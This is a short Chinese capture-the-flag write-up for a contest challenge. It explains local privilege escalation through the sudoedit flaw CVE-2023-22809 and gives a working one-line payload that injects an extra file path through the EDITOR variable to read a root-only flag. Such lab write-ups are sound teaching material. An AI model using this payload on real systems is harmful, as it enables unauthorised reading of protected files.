# sudo

> 分类：Misc

## 题目描述

SSH 连接后发现根目录下有 flag，需要 root 权限。根据题目描述应该为 sudo 提权（CVE-2023-22809）。

## 考察知识点

- Linux sudo 提权（CVE-2023-22809）
- sudoedit 环境变量注入

## 解法

1. `sudo -l` 查看 NOPASSWD 特殊权限：

```
User xiaonannan may run the following commands on engine-1:
    (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB
```

2. `/etc/GAMELAB` 有特殊权限，环境无 vim 有 nano，尝试 payload：

```
EDITOR="nano -- /flag" sudoedit /etc/GAMELAB
```

即可在 nano 编辑模式下读取 flag。

## 参考答案

（flag 通过 sudoedit 提权读取 `/flag`）

## 来源

- 作者：Lazzaro | https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/index.html
